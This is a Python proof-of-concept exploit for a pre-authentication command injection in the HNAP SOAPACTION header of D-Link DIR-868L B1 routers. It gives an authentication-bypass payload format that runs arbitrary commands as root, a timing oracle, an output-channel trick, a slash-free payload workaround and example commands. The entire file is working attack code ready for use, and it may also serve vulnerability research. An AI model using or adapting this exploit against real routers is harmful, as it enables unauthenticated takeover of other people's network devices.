#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC: pre-auth command injection via HNAP SOAPACTION
D-Link DIR-868L B1, firmware 2.01b05
  GET /HNAP1/  +  SOAPACTION: "http://purenetworks.com/HNAP1/GetDeviceSettings/; <cmd>;"
  -> substring auth bypass -> action after last '/' -> system() as root
Blind oracle:  sleep N  -> response takes ~N seconds
Output channel: prefix commands with  echo Content-Type: text/plain; echo;
Payload must be slash-free (construct '/' at runtime, see examples).

Usage:
  python3 poc_hnap_injection.py <host> [command]
Examples:
  python3 poc_hnap_injection.py 192.168.0.1 "sleep 10"
  python3 poc_hnap_injection.py 192.168.0.1 "echo Content-Type: text/plain; echo; uname -a"
  python3 poc_hnap_injection.py 192.168.0.1 "s=`echo $PATH | busybox cut -c1`; echo Content-Type: text/plain; echo; cat ${s}proc${s}self${s}status"
"""
import socket
import sys
import time

PREFIX = 'http://purenetworks.com/HNAP1/GetDeviceSettings/'


def inject(host, cmd, port=80, timeout=90):
    sa = '"%s; %s;"' % (PREFIX, cmd)
    req = ("GET /HNAP1/ HTTP/1.1\r\nHost: %s\r\nSOAPACTION: %s\r\n"
           "Connection: close\r\n\r\n" % (host, sa))
    t0 = time.time()
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req.encode())
    buf = b""
    while True:
        d = s.recv(4096)
        if not d:
            break
        buf += d
    s.close()
    return time.time() - t0, buf.decode("latin1")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.1"
    cmd = sys.argv[2] if len(sys.argv) > 2 else "sleep 10"
    el, r = inject(host, cmd)
    print("[%s] elapsed %.2fs" % (r.split("\r\n")[0] if r else "no response", el))
    if "\r\n\r\n" in r:
        print(r.split("\r\n\r\n", 1)[1])
